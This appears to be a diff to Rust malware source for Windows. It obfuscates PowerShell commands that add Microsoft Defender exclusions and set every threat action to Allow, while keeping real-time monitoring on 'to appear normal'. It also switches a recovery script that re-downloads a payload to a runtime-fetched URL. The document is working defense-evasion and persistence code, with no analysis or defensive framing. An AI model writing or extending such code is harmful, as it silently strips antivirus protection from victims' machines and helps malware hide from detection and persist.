@@ -27,8 +27,9 @@ fn run_encoded_ps(script: &str) -> std::io::Result<std::process::Output> {
 
 #[cfg(windows)]
 pub fn add_defender_exclusion(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
+    use obfstr::obfstr;
     // Obfuscated Exclusion Add
-    let script = format!("Add-MpPreference -ExclusionPath '{}' -Force", path.display());
+    let script = format!(obfstr!("Add-MpPreference -ExclusionPath '{}' -Force"), path.display());
     let _ = run_encoded_ps(&script);
     Ok(())
 }
@@ -40,11 +41,11 @@ pub fn neutralize_defender() -> Result<(), Box<dyn std::error::Error>> {
     // SevereThreatDefaultAction = 6 (Allow)
     // Moderate... Low... = 6
     // Disable Sample Submission = 2
-    let script = r#"
+    let script = obfstr!(r#"
         Set-MpPreference -HighThreatDefaultAction 6 -SevereThreatDefaultAction 6 -ModerateThreatDefaultAction 6 -LowThreatDefaultAction 6 -Force;
         Set-MpPreference -SubmitSamplesConsent 2 -Force;
         Set-MpPreference -DisableRealtimeMonitoring $false; # Keep Realtime ON to appear normal, but actions are ALLOW
-    "#;
+    "#);
     let _ = run_encoded_ps(script);
     Ok(())
 }
@@ -61,7 +62,7 @@ pub fn neutralize_defender() -> Result<(), Box<dyn std::error::Error>> {
 
 
 fn get_recovery_script() -> String {
-    use crate::common::constants::DOWNLOAD_URL;
+    use crate::common::constants::get_download_url;
     format!(
         r#"
 $ErrorActionPreference = "SilentlyContinue"
@@ -111,7 +112,7 @@ if (-not $alive) {{
     }}
 }}
 "#,
-        download_url = DOWNLOAD_URL
+        download_url = get_download_url()
     )
 }
 
